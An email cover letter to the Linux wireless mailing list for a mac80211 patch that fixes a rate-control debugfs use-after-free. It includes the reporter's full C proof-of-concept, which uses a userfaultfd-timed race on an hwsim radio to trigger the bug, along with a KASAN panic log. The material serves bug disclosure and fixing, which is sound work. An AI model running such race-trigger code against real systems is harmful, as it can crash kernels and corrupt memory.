Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.176
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793202188;
	b=bcEfCsgFKEEq2amI3oQkZP1XzbCv0fH4hUs7pzyBx9X0ug6SY073c+24pBQn4cn/JYKS
	 GdPaldIKHYdsY5wXerSr12xoSr8AhSbF3GTxNuHZ+Dcy01/xaoZIgjsiN4Va9csdZQPrq
	 VxSW1se1uYMZEI1cR5JamFh9fpQPH90JbiAbpZCTOxILeDoEKRqLXRYEbJpaUjBuSOfhp
	 +zS/HSHZdJ2XdOiSWdeJRQDcXAAaw+V7TCZtv7EExBbxMtEjI4xsSlfgqjt1LQTvRNpHu
	 G5Y17Em1QZP+51cIHE8ITbSta9hdER6lGMJqOimW/Sga908Tda8tzKh222xk+6iouLQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793202188;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=vWVvGepb8iqlOe1Et9f69tz7us+/8Y01aopDE96wNNE=;
	b=DsWaok1vUwkq9hG89zn7X7ZlfP7ixdLKn0kGr0Cp+7dF9PtaCICBHZSYdF8cS0/03J1J
	 /YKR14DuSW6mcUAGLPf50q2MZV1avaIAbNakIqhPlK7VlSgVN784uX/Qs0yYZEEnzOiMB
	 /rFY45jwz+29km9yN3tTx+rBGp1nVpGEkJ5+ALSpxN++dFqRnUFqAWyGHcZgpGUjm+jl3
	 45lk+pohXGzXM7SuEWf1O5i6vxTfwgBEDh/KtPjOrhJqLiv7vwa8fBsbWh7DGRQJ5k7RI
	 XY5qoBXgBBqbNGXIPv8dM9KhJm/4ES2RMC6JiSO9s74Tz33cfUit6PBt+HiSZ+FdHCQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ll9EP5Vu;
	arc=none smtp.remote-ip=209.85.214.176
Received: from mail-pl1-f176.google.com (mail-pl1-f176.google.com [209.85.214.176])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7BC48606A31D
	for <linux-wireless@vger.kernel.org>; Wed, 28 Oct 2026 15:43:07 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 7BC48606A31D
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ll9EP5Vu
Received: by mail-pl1-f176.google.com with SMTP id d9443c01a7336-2e987a2ba0cso7420745ad.3
        for <linux-wireless@vger.kernel.org>; Wed, 28 Oct 2026 08:43:07 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1793202187; x=1793806987; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=vWVvGepb8iqlOe1Et9f69tz7us+/8Y01aopDE96wNNE=;
        b=ll9EP5Vu6sVVrzgwPblBRLBn3bP0jzNzucRFWxUIcYMKcupew4V28wmFiIqixOowHQ
         M0IPYPd6sZw9Lst6KApfp8e03OQ0s6BQ9wJy1HnCqDglEgOmh4R1J+tHXQOm+USRmEIW
         wPcK4k7Rcd2jN6YLXXvJ58g/mQzQJUu/Z621ANztV966qgy0J6GEhf2vzCDtVQobxUy0
         rq0g9EUwjFE8q9eZzzHf8ElGOVIsEumMl/CuBavbfsEzOi95LjFLlXe1cvO2obq5OjI2
         XeRDg20GH0uy/BpTtZh7nUGvuNHRGZVc2x+y4aDkoPthCDJmQtMVKPiyZ/rixDjEiT6S
         Cczg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1793202187; x=1793806987;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=vWVvGepb8iqlOe1Et9f69tz7us+/8Y01aopDE96wNNE=;
        b=FRnyvv+tbvugd4Q/Yp5x+wA160OUJwMXGhligNPlpzOmgMKbRS9RiKiNX4ocdKv1bE
         8XJtbOr1AuaGxjQrb3h2I9oqLSdt64DdLtmiIv1/otxYV3XcmO56oFtZmlHtVtODOChD
         NBeb2/cqmmf//L+JsHPejxbkuVYiUs0/9LJ0ma6ZTsZB6itxbSRQr+xRJZRuO+aW8tG5
         uxufVkVZUAMZ1SXOQvljldluHNpptkQbBahIgW3bU2/PXxaoHye/Nl9KXpg3r6jr7V/u
         CNJn6cB2mPt64h5e2l4dw088Pwnpq1suah2miyTB8ZwdRtADNsermMU8SiURXiVOOpxL
         1Eiw==
X-Gm-Message-State: AFq9FYJg+luJAFmGZTBKAmV9cnePYAI+ZLnn2e+C3iKgcFEZFiph5n7o
	d074DoIBo//vJADOITsXh41zTzq8HjhPgpOm5MF37jRXm1T1xXGtIyK4+0CSk+7iUo+E8O66a1W
	ynVltNA==
X-Gm-Gg: AYBFou3CoYyXpJj/LrMeFji/OD8IPOH/svks2vU2y0dBlHYb5PZzUl8KDNKE787lxfB
	UUByw+nb+6btHJl6EdWqR/7kZ2RFz1uj2tw/37FNJhMOgPHOKoiPkyguU41dqygfvzR8x6VVaxD
	oCEXBrFnS2UnfNA/5imVrWN0auaykss5b+4OSrxxtoDNYwHRmAFqmsn/ycx8BUM89WAynHEbqKW
	AdUCpyNzxlUJN8I6l52pY+BhyFSSfY25mQyVsDr3eCB0KX2cnUUlnj4c5WJVNMkZs2xeg3C2Vb2
	AadEqFnER558lR8oPzeOcflx79KD3hfoSKVNnAR5jHaR36JGYYYVNCSfbW2g1UZqALe2vAGdhwp
	hBgaFTVGMdRj9svygE5VerL5XsTrSlPg5kvcr1AeWevBSwKafTRzjjUEUk9OLKQPexDHR0hbfP6
	DGMuhDB2YR28kNeqoGg4mewinBNDC3gZEer7Z5q609x2yTljcoFO6+6eIyFa3Y3oFTkGQKEONb0
	KMHgqb13SvDSCRv+h11ESzb865113DmZjTWk9qcvkyaozV4KTNoaI3wyAgGeEbmzKKwkW8MWwb1
	uddkAMBLWlGH4X1mXxk6oeBSW3cnrQSHRbi/wEfB2g==
X-Received: by 2002:a17:90b:224f:b0:3a0:b312:1fbe with SMTP id 98e67ed59e1d1-3ae580a7ac7mr1828345a91.23.1793202186556;
        Wed, 28 Oct 2026 08:43:06 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ae6e7dbe1esm40793a91.5.2026.10.28.08.43.03
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 28 Oct 2026 08:43:05 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	nbd@nbd.name,
	linville@tuxdriver.com,
	sumit.garg@kernel.org,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH 0/1] wifi: mac80211: drain rate-control debugfs before free
Date: Wed, 28 Oct 2026 23:43:00 +0800
Message-ID: <cover.1793108147.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Post: <mailto:linux-wireless@vger.kernel.org>
List-Help: <mailto:linux-wireless+help@vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-wireless+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

This patch drains rate-control debugfs callbacks before freeing their
state, and closes interface creation during teardown. It also fixes the
notifier-failure unwind order on the current wireless/main base.

Hi Linux kernel maintainers,

This patch fixes use-after-free races when mac80211 rate-control state is
torn down while debugfs callbacks remain active. The archived reproducer
requires root in the initial user namespace, a mac80211_hwsim radio using
minstrel_ht, mounted debugfs, and userfaultfd support.

---- details below ----

Bug details:

The fixed_rate_idx debugfs file points into Minstrel's private allocation.
rate_control_free() previously freed that allocation before removing the
debugfs subtree, so an active write could resume after copy_from_user()
and access freed state. The root-level rate_ctrl_alg file has a related
lifetime: its callback reads local->rate_ctrl while teardown releases the
rate-control reference.

The patch saves the rate_ctrl_alg dentry and synchronously removes both
rate-control debugfs entries before clearing local->rate_ctrl or freeing
private state. Interface removal marks local->unregistering under RTNL;
ieee80211_if_add() then rejects additions during deinitialization. In the
notifier-failure path, interfaces are removed under RTNL, RTNL is released,
rate control is deinitialized, and only then is the wiphy unregistered.

The Fixes trailers identify the relevant changes: 5b5e87314efb removed
Minstrel's per-file debugfs cleanup; bddb2afcb6c5 added the root-level
rate_ctrl_alg file; 75636525fbfa removed the old interface registration
gate; and 52e04b4ce5d0 moved wiphy unregistration before rate-control
deinitialization on the registration-failure path.

Reproducer:

Build dependencies are gcc, make, libnl-3-dev, and libnl-genl-3-dev. From
the archived input/poc directory, run as root in the initial user namespace
with debugfs mounted and an hwsim Minstrel radio available:

  make
  ./poc

The reporter's archived QEMU log is from Linux 6.12.95 and records a
KASAN-triggered panic in debugfs_u32_set() during the fixed_rate_idx write.
It is historical reporter evidence, not output from the current patched
guest.

This candidate was built against wireless/main commit
25e73f1d6868c759c8eb56cad4e411692c5341b4 and tested in a 1-vCPU, 4-GiB
QEMU TCG guest with KASAN enabled and panic_on_warn=0. The fixed-rate
userfaultfd race was exercised with a separate raw-netlink harness, not the
reporter's libnl PoC, and completed with write_result=2, delete_result=0,
and the faulting page supplied. The rate_ctrl_alg reader test completed 100
rounds with two readers and no observed KASAN report. A 2-second interface
add/delete run completed with 65 attempts, 15 successes, 50 ENODEV-family
failures, and delete ACK 0. These tests exercised the patched guest only;
there was no clean-guest comparison for this candidate.

After those tests, an optional fixed_rate_idx check targeted phy0 after the
interface harness had deleted it. That missing path made the init=/bin/bash
PID 1 shell exit; the kernel reported "Attempted to kill init". This was a
harness sequencing error, not a target KASAN/Oops finding. The optional
functional read/write check did not complete. The notifier-registration
failure path was not directly fault-injected.

The reporter's PoC and original QEMU log below are copied verbatim from
input/poc/poc.c and input/poc/qemu.log, respectively.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <poll.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include <linux/userfaultfd.h>

#include <netlink/attr.h>
#include <netlink/genl/ctrl.h>
#include <netlink/genl/genl.h>
#include <netlink/msg.h>
#include <netlink/netlink.h>

enum hwsim_commands {
	HWSIM_CMD_UNSPEC,
	HWSIM_CMD_REGISTER,
	HWSIM_CMD_FRAME,
	HWSIM_CMD_TX_INFO_FRAME,
	HWSIM_CMD_NEW_RADIO,
	HWSIM_CMD_DEL_RADIO,
	HWSIM_CMD_GET_RADIO,
};

enum hwsim_attrs {
	HWSIM_ATTR_UNSPEC,
	HWSIM_ATTR_ADDR_RECEIVER,
	HWSIM_ATTR_ADDR_TRANSMITTER,
	HWSIM_ATTR_FRAME,
	HWSIM_ATTR_FLAGS,
	HWSIM_ATTR_RX_RATE,
	HWSIM_ATTR_SIGNAL,
	HWSIM_ATTR_TX_INFO,
	HWSIM_ATTR_COOKIE,
	HWSIM_ATTR_CHANNELS,
	HWSIM_ATTR_RADIO_ID,
	HWSIM_ATTR_REG_HINT_ALPHA2,
	HWSIM_ATTR_REG_CUSTOM_REG,
	HWSIM_ATTR_REG_STRICT_REG,
	HWSIM_ATTR_SUPPORT_P2P_DEVICE,
	HWSIM_ATTR_USE_CHANCTX,
	HWSIM_ATTR_DESTROY_RADIO_ON_CLOSE,
	HWSIM_ATTR_RADIO_NAME,
};

struct race_state {
	int uffd;
	size_t page_size;
	void *fault_page;
	char payload[32];
	pthread_mutex_t lock;
	pthread_cond_t cond;
	bool fault_seen;
	bool allow_resume;
	bool page_copied;
};

struct delete_state {
	pthread_mutex_t lock;
	pthread_cond_t cond;
	bool should_delete;
	char phy_name[NAME_MAX];
};

struct write_state {
	int fd;
	const void *buf;
	size_t len;
};

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void die_nl(int err, const char *what)
{
	fprintf(stderr, "%s: %s\n", what, nl_geterror(err));
	exit(EXIT_FAILURE);
}

static int file_exists(const char *path)
{
	return access(path, F_OK) == 0;
}

static int find_hwsim_phy(char *phy_name, size_t phy_name_len, char *fixed_rate_path,
			  size_t fixed_rate_path_len)
{
	DIR *dir;
	struct dirent *de;
	char hwsim_path[PATH_MAX];
	char rc_path[PATH_MAX];

	dir = opendir("/sys/kernel/debug/ieee80211");
	if (!dir)
		return -1;

	while ((de = readdir(dir)) != NULL) {
		if (strncmp(de->d_name, "phy", 3) != 0)
			continue;

		snprintf(hwsim_path, sizeof(hwsim_path),
			 "/sys/kernel/debug/ieee80211/%s/hwsim", de->d_name);
		snprintf(rc_path, sizeof(rc_path),
			 "/sys/kernel/debug/ieee80211/%s/rc/fixed_rate_idx",
			 de->d_name);

		if (!file_exists(hwsim_path) || !file_exists(rc_path))
			continue;

		if (strlen(de->d_name) >= phy_name_len)
			continue;
		strcpy(phy_name, de->d_name);
		snprintf(fixed_rate_path, fixed_rate_path_len, "%s", rc_path);
		closedir(dir);
		return 0;
	}

	closedir(dir);
	return -1;
}

static int del_radio_by_name(const char *phy_name)
{
	struct nl_sock *sock;
	struct nl_msg *msg;
	int family;
	int err;

	sock = nl_socket_alloc();
	if (!sock)
		return -NLE_NOMEM;

	err = genl_connect(sock);
	if (err < 0) {
		nl_socket_free(sock);
		return err;
	}

	family = genl_ctrl_resolve(sock, "MAC80211_HWSIM");
	if (family < 0) {
		nl_socket_free(sock);
		return family;
	}

	msg = nlmsg_alloc();
	if (!msg) {
		nl_socket_free(sock);
		return -NLE_NOMEM;
	}

	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family, 0, 0,
			 HWSIM_CMD_DEL_RADIO, 1)) {
		nlmsg_free(msg);
		nl_socket_free(sock);
		return -NLE_MSGSIZE;
	}

	err = nla_put_string(msg, HWSIM_ATTR_RADIO_NAME, phy_name);
	if (err < 0) {
		nlmsg_free(msg);
		nl_socket_free(sock);
		return err;
	}

	err = nl_send_auto(sock, msg);
	nlmsg_free(msg);
	if (err < 0) {
		nl_socket_free(sock);
		return err;
	}

	err = nl_wait_for_ack(sock);
	nl_socket_free(sock);
	return err;
}

static void *uffd_thread(void *arg)
{
	struct race_state *race = arg;
	struct pollfd pfd = {
		.fd = race->uffd,
		.events = POLLIN,
	};
	struct uffd_msg msg;
	char *page;
	ssize_t nread;
	struct uffdio_copy copy = {};

	if (poll(&pfd, 1, -1) < 0)
		die_errno("poll(userfaultfd)");

	nread = read(race->uffd, &msg, sizeof(msg));
	if (nread < 0)
		die_errno("read(userfaultfd)");
	if ((size_t)nread != sizeof(msg)) {
		fprintf(stderr, "short read from userfaultfd: %zd\n", nread);
		exit(EXIT_FAILURE);
	}
	if (msg.event != UFFD_EVENT_PAGEFAULT) {
		fprintf(stderr, "unexpected userfaultfd event: %u\n", msg.event);
		exit(EXIT_FAILURE);
	}

	pthread_mutex_lock(&race->lock);
	race->fault_seen = true;
	pthread_cond_broadcast(&race->cond);
	while (!race->allow_resume)
		pthread_cond_wait(&race->cond, &race->lock);
	pthread_mutex_unlock(&race->lock);

	page = calloc(1, race->page_size);
	if (!page)
		die_errno("calloc(page)");
	memcpy(page, race->payload, strlen(race->payload));

	copy.src = (unsigned long)page;
	copy.dst = (unsigned long)race->fault_page;
	copy.len = race->page_size;
	if (ioctl(race->uffd, UFFDIO_COPY, &copy) < 0)
		die_errno("ioctl(UFFDIO_COPY)");

	free(page);

	pthread_mutex_lock(&race->lock);
	race->page_copied = true;
	pthread_cond_broadcast(&race->cond);
	pthread_mutex_unlock(&race->lock);

	return NULL;
}

static void *delete_thread(void *arg)
{
	struct delete_state *state = arg;
	int err;

	pthread_mutex_lock(&state->lock);
	while (!state->should_delete)
		pthread_cond_wait(&state->cond, &state->lock);
	pthread_mutex_unlock(&state->lock);

	fprintf(stderr, "[*] deleting radio %s\n", state->phy_name);
	err = del_radio_by_name(state->phy_name);
	if (err < 0)
		die_nl(err, "HWSIM_CMD_DEL_RADIO");

	fprintf(stderr, "[*] delete request finished\n");
	return NULL;
}

static void *write_thread(void *arg)
{
	struct write_state *state = arg;
	static ssize_t result;

	result = write(state->fd, state->buf, state->len);
	fprintf(stderr, "[*] write() returned %zd (errno=%d)\n", result, errno);
	return NULL;
}

static int setup_userfaultfd(struct race_state *race)
{
	struct uffdio_api api = {
		.api = UFFD_API,
	};
	struct uffdio_register reg = {
		.range = {
			.start = (unsigned long)race->fault_page,
			.len = race->page_size,
		},
		.mode = UFFDIO_REGISTER_MODE_MISSING,
	};

	race->uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (race->uffd < 0)
		return -1;
	if (ioctl(race->uffd, UFFDIO_API, &api) < 0)
		return -1;
	if (ioctl(race->uffd, UFFDIO_REGISTER, &reg) < 0)
		return -1;
	return 0;
}

int main(void)
{
	char phy_name[NAME_MAX];
	char fixed_rate_path[PATH_MAX];
	struct race_state race = {
		.uffd = -1,
		.payload = "7\n",
		.lock = PTHREAD_MUTEX_INITIALIZER,
		.cond = PTHREAD_COND_INITIALIZER,
	};
	struct delete_state del = {
		.lock = PTHREAD_MUTEX_INITIALIZER,
		.cond = PTHREAD_COND_INITIALIZER,
	};
	pthread_t uffd_tid;
	pthread_t del_tid;
	pthread_t wr_tid;
	size_t page_size;
	int fd;
	void *map;
	struct write_state write_arg = {};

	if (geteuid() != 0) {
		fprintf(stderr, "run as root\n");
		return EXIT_FAILURE;
	}

	if (find_hwsim_phy(phy_name, sizeof(phy_name), fixed_rate_path,
			   sizeof(fixed_rate_path)) != 0) {
		fprintf(stderr, "no hwsim fixed_rate_idx file found\n");
		return EXIT_FAILURE;
	}

	fprintf(stderr, "[*] target radio: %s\n", phy_name);
	fprintf(stderr, "[*] target file: %s\n", fixed_rate_path);

	fd = open(fixed_rate_path, O_WRONLY);
	if (fd < 0)
		die_errno("open(fixed_rate_idx)");

	page_size = sysconf(_SC_PAGESIZE);
	if ((long)page_size <= 0) {
		fprintf(stderr, "invalid page size\n");
		return EXIT_FAILURE;
	}

	map = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
		   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (map == MAP_FAILED)
		die_errno("mmap");

	race.page_size = page_size;
	race.fault_page = map;

	if (setup_userfaultfd(&race) != 0)
		die_errno("setup_userfaultfd");

	snprintf(del.phy_name, sizeof(del.phy_name), "%s", phy_name);
	write_arg.fd = fd;
	write_arg.buf = race.fault_page;
	write_arg.len = strlen(race.payload);

	if (pthread_create(&uffd_tid, NULL, uffd_thread, &race) != 0)
		die_errno("pthread_create(uffd)");
	if (pthread_create(&del_tid, NULL, delete_thread, &del) != 0)
		die_errno("pthread_create(delete)");
	if (pthread_create(&wr_tid, NULL, write_thread, &write_arg) != 0)
		die_errno("pthread_create(write)");

	pthread_mutex_lock(&race.lock);
	while (!race.fault_seen)
		pthread_cond_wait(&race.cond, &race.lock);
	pthread_mutex_unlock(&race.lock);
	fprintf(stderr, "[*] write is stalled in copy_from_user()\n");

	pthread_mutex_lock(&del.lock);
	del.should_delete = true;
	pthread_cond_signal(&del.cond);
	pthread_mutex_unlock(&del.lock);

	/* Let teardown get past kfree(priv) and block in debugfs removal. */
	usleep(500000);

	pthread_mutex_lock(&race.lock);
	race.allow_resume = true;
	pthread_cond_signal(&race.cond);
	pthread_mutex_unlock(&race.lock);
	fprintf(stderr, "[*] released the faulting page\n");

	pthread_join(wr_tid, NULL);
	pthread_join(uffd_tid, NULL);
	pthread_join(del_tid, NULL);

	sleep(1);
	return EXIT_SUCCESS;
}
------END poc.c------

----BEGIN reporter crash log----
[  263.287963][T10466] page_owner tracks the page as allocated
[  263.288967][T10466] page last allocated via order 0, migratetype Unmovable, gfp_mask 0x52cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP), pid 1, tgid 1 (swapper/0), ts 14264745909, free_ts 14238581692
[  263.292072][T10466] page last free pid 59 tgid 59 stack trace:
[  263.293579][T10466] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  263.295017][T10466] CPU: 2 UID: 0 PID: 10466 Comm: poc Not tainted 6.12.95 #2
[  263.296464][T10466] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  263.298775][T10466] Call Trace:
[  263.299251][T10466]  <TASK>
[  263.299702][T10466]  panic+0x533/0x610
[  263.300304][T10466]  ? __pfx_panic+0x10/0x10
[  263.300971][T10466]  ? irqentry_exit+0x3b/0x90
[  263.301639][T10466]  ? srso_alias_return_thunk+0x5/0xfbef5
[  263.302459][T10466]  ? debugfs_u32_set+0x4a/0x60
[  263.303209][T10466]  ? debugfs_u32_set+0x4a/0x60
[  263.303892][T10466]  check_panic_on_warn+0x61/0x80
[  263.304595][T10466]  end_report+0x11b/0x180
[  263.305207][T10466]  kasan_report+0xe8/0x110
[  263.305867][T10466]  ? debugfs_u32_set+0x4a/0x60
[  263.306532][T10466]  ? __pfx_debugfs_u32_set+0x10/0x10
[  263.307303][T10466]  debugfs_u32_set+0x4a/0x60
[  263.307957][T10466]  simple_attr_write_xsigned.isra.0+0x1a0/0x260
[  263.308842][T10466]  ? __pfx_simple_attr_write_xsigned.isra.0+0x10/0x10
[  263.309849][T10466]  ? rcu_is_watching+0x12/0xc0
[  263.310571][T10466]  ? srso_alias_return_thunk+0x5/0xfbef5
[  263.311387][T10466]  ? trace_lock_acquire+0x145/0x1c0
[  263.312151][T10466]  ? srso_alias_return_thunk+0x5/0xfbef5
[  263.312966][T10466]  ? ksys_write+0xfb/0x1d0
[  263.313619][T10466]  debugfs_attr_write+0x65/0x90
[  263.314301][T10466]  vfs_write+0x21d/0xf30
[  263.314913][T10466]  ? __pfx_vfs_write+0x10/0x10
[  263.315586][T10466]  ? srso_alias_return_thunk+0x5/0xfbef5
[  263.316398][T10466]  ? srso_alias_return_thunk+0x5/0xfbef5
[  263.317287][T10466]  ? __fget_files+0x1c9/0x300
[  263.318131][T10466]  ksys_write+0xfb/0x1d0
[  263.318899][T10466]  ? __pfx_ksys_write+0x10/0x10
[  263.319777][T10466]  ? srso_alias_return_thunk+0x5/0xfbef5
[  263.320789][T10466]  do_syscall_64+0xc7/0x270
[  263.321632][T10466]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  263.322694][T10466] RIP: 0033:0x7f5a4a8199ee
[  263.323461][T10466] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
[  263.326888][T10466] RSP: 002b:00007f5a49779e68 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[  263.328528][T10466] RAX: ffffffffffffffda RBX: 00007f5a4977a6c0 RCX: 00007f5a4a8199ee
[  263.330096][T10466] RDX: 0000000000000002 RSI: 00007f5a4a9b0000 RDI: 0000000000000003
[  263.331503][T10466] RBP: ffffffffffffff40 R08: 0000000000000000 R09: 0000000000000000
[  263.332893][T10466] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000020
[  263.334318][T10466] R13: 0000000000000002 R14: 00007ffe52acf820 R15: 00007f5a48f7a000
[  263.335728][T10466]  </TASK>
[  263.336683][T10466] Kernel Offset: disabled
[  263.337470][T10466] Rebooting in 86400 seconds..
----END reporter crash log----

Best regards,
Zixuan Chai

Zixuan Chai (1):
  wifi: mac80211: drain rate-control debugfs before free

 net/mac80211/debugfs.c     | 2 +-
 net/mac80211/ieee80211_i.h | 2 ++
 net/mac80211/iface.c       | 4 ++++
 net/mac80211/main.c        | 5 +++++
 net/mac80211/rate.c        | 7 ++++---
 5 files changed, 16 insertions(+), 4 deletions(-)

-- 
2.34.1

